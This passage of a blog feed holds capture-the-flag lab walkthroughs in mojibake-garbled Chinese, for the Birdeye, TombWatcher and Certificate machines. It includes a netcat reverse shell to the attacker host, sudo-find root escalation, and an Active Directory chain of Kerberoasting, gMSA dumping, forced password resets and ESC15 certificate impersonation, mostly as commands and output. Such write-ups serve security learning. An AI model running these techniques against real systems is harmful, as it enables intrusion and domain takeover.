\n```\n\nè¿™æ ·å°±æ‹¿åˆ°äº† `Cookie` ï¼Œæˆ‘ä»¬å­˜å‚¨åœ¨ `http://192.168.56.127/admin/dashboard` ä¸­\n\n![image.png](/post-images/HackMyVMBirdeye/image6.png)\n\nçœ‹æ ·å­æ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œçš„åŠŸèƒ½\n\n![image.png](/post-images/HackMyVMBirdeye/image7.png)\n\nè¿›è¡Œåå¼¹ `shell`\n\n```python\ncommand=busybox nc 192.168.56.5 1234 -e /bin/bash\n```\n\n## ææƒ - sev\n\næŸ¥çœ‹ sudo æƒé™\n\n```python\nwww-data@birdeye:~/birdeye$ sudo -l\nMatching Defaults entries for www-data on birdeye:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on birdeye:\n    (sev) NOPASSWD: /home/sev/backup_app.sh\n```\n\næŸ¥çœ‹å†…å®¹ï¼Œç›´æ¥ç»™äº†\n\n```python\nwww-data@birdeye:~/birdeye$ cat /home/sev/backup_app.sh\n#!/bin/bash\n/bin/bash -p\n```\n\nåˆ‡æ¢åˆ° sev\n\n```python\nwww-data@birdeye:~/birdeye$ sudo -u sev /home/sev/backup_app.sh \nsev@birdeye:~/birdeye$ \n```\n\n## ææƒ - root\n\n```python\nsev@birdeye:~/birdeye$ sudo -l\nMatching Defaults entries for sev on birdeye:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser sev may run the following commands on birdeye:\n    (ALL) NOPASSWD: /usr/bin/find\n```\n\nç»“æŸäº†\n\n```python\nsev@birdeye:~/birdeye$ sudo find . -exec /bin/sh \\; -quit\n# id\nuid=0(root) gid=0(root) groups=0(root\n```\n\n## æ€»ç»“\n\nï¼Ÿ",
            "url": "https://www.sunsetaction.top/2025/10/17/HackMyVMBirdeye",
            "title": "HackMyVM - Birdeye",
            "summary": "Birdeye. https://hackmyvm.eu/machines/machine.php?vm=Birdeye Recon PortScan æšä¸¾ 80 ç«¯å£çš„æœç´¢æ—¶å‘çš„åŒ…å¾ˆå¥‡æ€ª çœ‹ç€å­˜åœ¨ SSRF æ”¹æˆ kali çš„ IP è¯•è¯• å­˜åœ¨ SSRF å¹¶ä¸”åŸæœ¬åé¢çš„ URL æ˜¯ï¼šhttp://...",
            "date_modified": "2025-10-17T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackMyVM",
                "Linux",
                "SSRF",
                "find"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - TombWatcher",
            "content_html": "\n# Season8 - TombWatcher\n\n> https://app.hackthebox.com/machines/TombWatcher | `Windows`Â |Â `Medium`\n> \n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image.png)\n\nMachine Informationï¼šAs is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: henry / H3nry_987TGV!\n\n## Recon\n\n### ç«¯å£æ‰«æ\n\n`nmap` ç«¯å£æ‰«æ\n\n```bash\nâœ  TombWatcher nmap -sT -min-rate 5000 10.10.11.72  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:01 CST\nNmap scan report for 10.10.11.72\nHost is up (0.059s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n\nNmap done: 1 IP address (1 host up) scanned in 1.24 seconds\n```\n\n```bash\nâœ  TombWatcher nmap -sT -A -p 53,80,88,135,139,389,445,464,5985 10.10.11.72                                       \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:03 CST                                                   \nNmap scan report for 10.10.11.72                         \nHost is up (0.10s latency).    \n                                                         \nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0    \n|_http-server-header: Microsoft-IIS/10.0                                                                          \n| http-methods:                                                                                                   \n|_  Potentially risky methods: TRACE            \n|_http-title: IIS Windows Server    \n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-08 07:41:39Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC01.tombwatcher.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb\n| Not valid before: 2024-11-16T00:47:59\n|_Not valid after:  2025-11-16T00:47:59\n|_ssl-date: 2025-06-08T07:42:31+00:00; +3h38m21s from scanner time.\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-06-08T07:41:51\n|_  start_date: N/A\n|_clock-skew: mean: 3h38m20s, deviation: 0s, median: 3h38m20s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   85.41 ms  10.10.16.1\n2   128.13 ms 10.10.11.72\n```\n\nè®¿é—®`HTTP`ï¼Œæ˜¯é»˜è®¤é¡µ\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image1.png)\n\næ‰«æäº†ä¸€æ³¢ï¼Œæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œé‡ç‚¹åº”è¯¥ä¸åœ¨è¿™ï¼Œå› ä¸ºç»™äº†å‡­æ®\n\n### å‡­æ®æµ‹è¯• & æœåŠ¡æšä¸¾\n\nä½¿ç”¨ `nxc` å¯¹å‡­æ®è¿›è¡Œæµ‹è¯•\n\n```bash\nâœ  TombWatcher nxc smb 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV!\nâœ  TombWatcher nxc ldap 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb\nLDAP        10.10.11.72     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nLDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV!\nâœ  TombWatcher nxc wmi 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb\nRPC         10.10.11.72     135    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nRPC         10.10.11.72     135    DC01             [+] tombwatcher.htb\\henry:H3nry_987TGV!\nâœ  TombWatcher nxc winrm 10.10.11.72 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb\nWINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)\nWINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\\henry:H3nry_987TGV!\n```\n\n```bash\nâœ  TombWatcher wmiexec.py tombwatcher.htb/henry:'H3nry_987TGV!'@10.10.11.72 -dc-ip 10.10.11.72\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] SMBv3.0 dialect used\n[-] WMI Session Error: code: 0x80041003 - WBEM_E_ACCESS_DENIED\n```\n\n`SMB` ä¹Ÿæ˜¯æ²¡ä»€ä¹ˆä¿¡æ¯\n\n```bash\nâœ  TombWatcher smbclient -L 10.10.11.72 -U tombwatcher.htb/henry%'H3nry_987TGV!'\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.72 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\n## åŸŸåˆ†æ - 1\n\n```bash\nâœ  TombWatcher bloodhound-python -u henry -p 'H3nry_987TGV!' -d 'tombwatcher.htb' -ns 10.10.11.72 --zip -c All -dc 'DC01.tombwatcher.htb' --dns-tcp\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: tombwatcher.htb\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.tombwatcher.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.tombwatcher.htb\nINFO: Found 12 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 2 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC01.tombwatcher.htb\nINFO: Done in 00M 12S\nINFO: Compressing output into 20250608163651_bloodhound.zip\n```\n\n`henry` æ‰€å±ç»„æƒé™\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image2.png)\n\nå¯¹`Alfred`æœ‰`writeSPN`æƒé™\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image3.png)\n\næˆ‘ä»¬å†çœ‹ä¸€ä¸‹ `Alfred` çš„æƒé™\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image4.png)\n\nç»§ç»­è·Ÿè¿›`INFRASTRUCTURE` ç»„ï¼Œèƒ½å¤Ÿè¯»å–æœºå™¨`ANSIBLE_DEV`çš„`GMSA`å¯†ç \n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image5.png)\n\nç„¶å `ANSIBLE_DEV` èƒ½å¤Ÿæ›´æ”¹ `SAM` ç”¨æˆ·å¯†ç \n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image6.png)\n\nå¹¶ä¸” `SAM` ç”¨æˆ·å¯¹ `JOHN`ç”¨æˆ·æ‹¥æœ‰ `genericAll`\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image7.png)\n\nç”¨æˆ·`John`çš„æƒé™ï¼Œæ˜¯è¿œç¨‹ç®¡ç†ç»„çš„æˆå‘˜\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image8.png)\n\n## åŸŸæ¸—é€\n\n### Kerberoasting\n\n> https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting\n> \n\næ”»å‡»è€…å¯ä»¥å°† SPN ï¼ˆ`ServicePrincipalName`ï¼‰ æ·»åŠ åˆ°è¯¥å¸æˆ·ã€‚ä¸€æ—¦è´¦æˆ·æ‹¥æœ‰ SPNï¼Œå®ƒå°±å®¹æ˜“å—åˆ°Â `Kerberoast` çš„æ”»å‡»Â ã€‚è¿™ç§æŠ€æœ¯ç§°ä¸º `Targeted Kerberoasting`\n\nå·¥å…·é“¾æ¥ï¼šhttps://github.com/ShutdownRepo/targetedKerberoast\n\n```bash\nâœ  targetedKerberoast python targetedKerberoast.py -v -d tombwatcher.htb --dc-ip 10.10.11.72 -u henry -p 'H3nry_987TGV!'\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image9.png)\n\nä½¿ç”¨`hashcat`è¿›è¡Œçˆ†ç ´\n\n```bash\nâœ  targetedKerberoast hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt \n```\n\nå¾—åˆ°å¯†ç  `basketball`\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image10.png)\n\n### ReadGMSAPassword\n\næµ‹è¯•`alfred`çš„å‡­æ®\n\n```bash\nâœ  TombWatcher nxc smb 10.10.11.72 -u alfred -p 'basketball' -d tombwatcher.htb\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\alfred:basketball \n```\n\nä¸Šè¾¹åˆ†æåŸŸçš„æ—¶å€™èƒ½çŸ¥é“`alfred`ç”¨æˆ·å¯ä»¥è¯»å–`ANSIBLE_DEV` è®¡ç®—æœºçš„`GMSA`å¯†ç \n\nå·¥å…·ï¼šhttps://github.com/micahvandeusen/gMSADumper\n\n```bash\nâœ  gMSADumper python gMSADumper.py -u alfred -p basketball -d tombwatcher.htb\nUsers or groups who can read password for ansible_dev$:\n > Infrastructure\nansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc\nansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3\nansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a\n```\n\næµ‹è¯•`ansible_dev$`çš„å‡­æ®\n\n```bash\nâœ  TombWatcher nxc smb 10.10.11.72 -u 'ansible_dev$' -H '1c37d00093dc2a5f25176bf2d474afdc' -d tombwatcher.htb   \nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\ansible_dev$:1c37d00093dc2a5f25176bf2d474afdc \n```\n\n### To John\n\n`ansible_dev$` æ‹¥æœ‰æ›´æ”¹ `SAM`ç”¨æˆ·å¯†ç çš„æƒé™\n\n```bash\nâœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'ansible_dev$' -p ':1c37d00093dc2a5f25176bf2d474afdc' --dc-ip 10.10.11.72 set password SAM 'Password123!'\n[+] Password changed successfully!\n```\n\næµ‹è¯• `SAM` å‡­æ®\n\n```bash\nâœ  TombWatcher nxc smb 10.10.11.72 -u 'SAM' -p 'Password123!' -d tombwatcher.htb\nSMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) \nSMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\\SAM:Password123! \n```\n\næˆ‘ä»¬å†é€šè¿‡`SAM`ç”¨æˆ·ä¿®æ”¹`John`ç”¨æˆ·çš„å¯†ç \n\n```bash\nâœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 set owner john sam\n[!] S-1-5-21-1392491010-1358638721-2126982587-1105 is already the owner, no modification will be made\n\nâœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 add genericAll john sam\n[+] sam has now GenericAll on john\n\nâœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'SAM' -p 'Password123!' --dc-ip 10.10.11.72 set password JOHN 'Password123!'\n[+] Password changed successfully!\n```\n\nä½¿ç”¨ `evil-winrm` è¿›è¡Œç™»å½•\n\n```bash\nâœ  TombWatcher evil-winrm -i 10.10.11.72 -u 'JOHn' -p 'Password123!'                \n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\john\\Documents> \n```\n\nèƒ½è¯»å– `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\john\\Desktop> type user.txt\n3941928223b1baf7d3a3b94a3953d597\n```\n\n## åŸŸåˆ†æ - 2\n\næ‹¿åˆ° `John` ç”¨æˆ·åï¼Œæˆ‘ä»¬å†è¿›è¡Œåˆ†æä¸€æ¬¡ï¼Œå¯»æ‰¾è·å¾—`Root`çš„è·¯å¾„\n\n`John` çš„æƒé™\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image11.png)\n\nè¿™åå­—å¸¦`CERT`ï¼Œä¿®æ”¹`CERT_ADMIN`å¯†ç ï¼Œå¹¶ç”¨å…¶å°è¯•ä½¿ç”¨ `certipy` æšä¸¾æ¼æ´\n\n```bash\nâœ  TombWatcher bloodyAD -d tombwatcher.htb -u 'JOHN' -p 'Password123!' --dc-ip 10.10.11.72 set password CERT_ADMIN 'Password123!'\n[+] Password changed successfully!\n```\n\n```bash\nâœ  TombWatcher certipy-ad find -u 'CERT_ADMIN' -p 'Password123!' -dc-ip 10.10.11.72 -vulnerable\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n[*] Finding certificate templates\n[*] Found 33 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 11 enabled certificate templates\n[*] Finding issuance policies\n[*] Found 13 issuance policies\n[*] Found 0 OIDs linked to templates\n[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'\n[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'\n[!] Error checking web enrollment: timed out\n[!] Use -debug to print a stacktrace\n[*] Saving text output to '20250608182737_Certipy.txt'\n[*] Wrote text output to '20250608182737_Certipy.txt'\n[*] Saving JSON output to '20250608182737_Certipy.json'\n[*] Wrote JSON output to '20250608182737_Certipy.json'\n```\n\næ£€æµ‹åˆ° `ESC15`\n\n```bash\nâœ  TombWatcher cat 20250608182737_Certipy.txt  \nCertificate Authorities                    \n  0                                        \n    CA Name                             : tombwatcher-CA-1\n    DNS Name                            : DC01.tombwatcher.htb\n    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb\n    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC\n    Certificate Validity Start          : 2024-11-16 00:47:48+00:00\n    Certificate Validity End            : 2123-11-16 00:57:48+00:00\n    Web Enrollment          \n      HTTP                                                                                                        \n        Enabled                         : False                                                                   \n      HTTPS                                                                                                       \n        Enabled                         : False\n    User Specified SAN                  : Disabled                                                                \n    Request Disposition                 : Issue                                                                   \n    Enforce Encryption for Requests     : Enabled                                                                 \n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions                                                                                                   \n      Owner                             : TOMBWATCHER.HTB\\Administrators\n      Access Rights                                                                                               \n        ManageCa                        : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins    \n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        ManageCertificates              : TOMBWATCHER.HTB\\Administrators\n                                          TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins                 \n        Enroll                          : TOMBWATCHER.HTB\\Authenticated Users      \nCertificate Templates\n  0\n    Template Name                       : WebServer\n    Display Name                        : Web Server\n    Certificate Authorities             : tombwatcher-CA-1\n    Enabled                             : True\n    Client Authentication               : False\n    Enrollment Agent                    : False\n    Any Purpose                         : False\n    Enrollee Supplies Subject           : True\n    Certificate Name Flag               : EnrolleeSuppliesSubject\n    Extended Key Usage                  : Server Authentication\n    Requires Manager Approval           : False\n    Requires Key Archival               : False\n    Authorized Signatures Required      : 0\n    Schema Version                      : 1\n    Validity Period                     : 2 years\n    Renewal Period                      : 6 weeks\n    Minimum RSA Key Length              : 2048\n    Template Created                    : 2024-11-16T00:57:49+00:00\n    Template Last Modified              : 2024-11-16T17:07:26+00:00\n    Permissions\n      Enrollment Permissions\n        Enrollment Rights               : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n                                          TOMBWATCHER.HTB\\cert_admin\n      Object Control Permissions\n        Owner                           : TOMBWATCHER.HTB\\Enterprise Admins\n        Full Control Principals         : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Owner Principals          : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Dacl Principals           : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n        Write Property Enroll           : TOMBWATCHER.HTB\\Domain Admins\n                                          TOMBWATCHER.HTB\\Enterprise Admins\n                                          TOMBWATCHER.HTB\\cert_admin\n    [+] User Enrollable Principals      : TOMBWATCHER.HTB\\cert_admin\n    [!] Vulnerabilities\n      ESC15                             : Enrollee supplies subject and schema version is 1.\n    [*] Remarks\n      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image12.png)\n\n## ESC 15\n\n> https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu\n> \n\n```bash\nâœ  TombWatcher certipy-ad req \\\n    -u 'CERT_ADMIN' -p 'Password123!' \\\n    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \\\n    -ca 'tombwatcher-CA-1' -template 'WebServer' \\\n    -upn 'administrator@tombwatcher.htb' \\\n    -application-policies 'Client Authentication'\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 33\n[*] Successfully requested certificate\n[*] Got certificate with UPN 'administrator@tombwatcher.htb'\n[*] Certificate has no object SID\n[*] Try using -sid to set the object SID or see the wiki for more details\n[*] Saving certificate and private key to 'administrator.pfx'\n[*] Wrote certificate and private key to 'administrator.pfx'\n```\n\n```bash\nâœ  TombWatcher certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: 'administrator@tombwatcher.htb'\n[*] Connecting to 'ldaps://10.10.11.72:636'\n[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\\\Administrator'\nType help for list of commands\n\n# whoami\nu:TOMBWATCHER\\Administrator\n```\n\næˆ‘ç›´æ¥æŠŠ `henry` åŠ å…¥ç®¡ç†å‘˜ç»„å’Œè¿œç¨‹ç»„\n\n```bash\n# add_user_to_group henry \"Domain Admins\"\nAdding user: Henry to group Domain Admins result: OK\n\n# add_user_to_group henry \"REMOTE MANAGEMENT USERS\"\nAdding user: Henry to group Remote Management Users result: OK\n```\n\nä½¿ç”¨ `evil-winrm` ç™»å½•å¹¶è¯»å– `root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\administrator\\desktop> type root.txt\n6d2352d2fcafb6b19e95e737b046864c\n```\n\n## æ€»ç»“\n\nä¸€æ³¢ä¸‹æ¥ç›´æ¥æ¢­å“ˆï¼Œè¿™æ¬¡æ²¡æœ‰å¡ä½çš„åœ°æ–¹\n\nä½†æ˜¯æˆ‘æ‰“å®Œåå‘ç°ï¼Œæˆ‘`BloodHound`æ”¶é›†ä¿¡æ¯çš„æ—¶å€™ï¼Œæœºå™¨å·²ç»æ˜¯è¢«äººä¿®æ”¹è¿‡çš„äº†\n\næ­£å¸¸æ¥è¯´æˆ‘æ˜¯ä¸èƒ½ç›´æ¥åœ¨`BloodHound`ä¸­å‘ç°`CERT_ADMIN`ç”¨æˆ·çš„ï¼Œå› ä¸ºå®ƒæ˜¯å·²ç»è¢«åˆ é™¤çš„ç”¨æˆ·ï¼Œæˆ‘éœ€è¦å¯¹å…¶è¿›è¡Œæ¢å¤ï¼Œå†è¿›è¡Œåç»­æ“ä½œ\n\n```bash\n# Enum isDeleted ADObject\nGet-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20TombWatcher/image13.png)\n\n```bash\n# æ¢å¤è´¦å·\nRestore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf\n# æ¿€æ´»è´¦å·\nEnable-ADAccount -Identity cert_admin\n```\n\nç„¶åæ‰å¯ä»¥æ˜¯ç”¨`BloodAD`è¿›è¡Œä¿®æ”¹å¯†ç ï¼Œè¿™é‡Œç›¸å½“äºç»™æˆ‘é™éš¾åº¦äº†\n\n```bash\n(Get-Acl \"AD:CN=john,CN=Users,DC=tombwatcher,DC=htb\").Access\n```",
            "url": "https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - TombWatcher",
            "title": "HackTheBox - Machine - TombWatcher",
            "summary": "Season8 TombWatcher https://app.hackthebox.com/machines/TombWatcher | Windows | Medium Machine Informationï¼šAs is common in real life Windows pentests,...",
            "date_modified": "2025-06-08T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Windows",
                "ADCS",
                "ESC15",
                "Kerberoasting"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - Certificate",
            "content_html": "\n# Season8 - Certificate\n\n> https://app.hackthebox.com/machines/Certificate | `Windows` | `Hard`\n> \n\n## å‰æœŸè¸©ç‚¹\n\n```bash\nâœ  Certificate nmap -sT -min-rate 5000 10.10.11.71             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:18 CST\nNmap scan report for 10.10.11.71\nHost is up (0.050s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n```\n\n```bash\nâœ  Certificate nmap -sT -A -p 80,135,139,445,636,389 10.10.11.71\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 21:19 CST\nNmap scan report for 10.10.11.71\nHost is up (0.076s latency).\n\nPORT    STATE SERVICE       VERSION\n80/tcp  open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)\n|_http-title: Did not follow redirect to http://certificate.htb/\n|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-06-01T20:59:35+00:00; +7h38m38s from scanner time.\n| ssl-cert: Subject: commonName=DC01.certificate.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb\n| Not valid before: 2024-11-04T03:14:54\n|_Not valid after:  2025-11-04T03:14:54\n445/tcp open  microsoft-ds?\n636/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2025-06-01T20:59:36+00:00; +7h38m37s from scanner time.\n| ssl-cert: Subject: commonName=DC01.certificate.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb\n| Not valid before: 2024-11-04T03:14:54\n|_Not valid after:  2025-11-04T03:14:54\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019|10 (97%)\nOS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-06-01T20:58:58\n|_  start_date: N/A\n|_clock-skew: mean: 7h38m37s, deviation: 0s, median: 7h38m37s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   85.58 ms 10.10.16.1\n2   87.46 ms 10.10.11.71\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.74 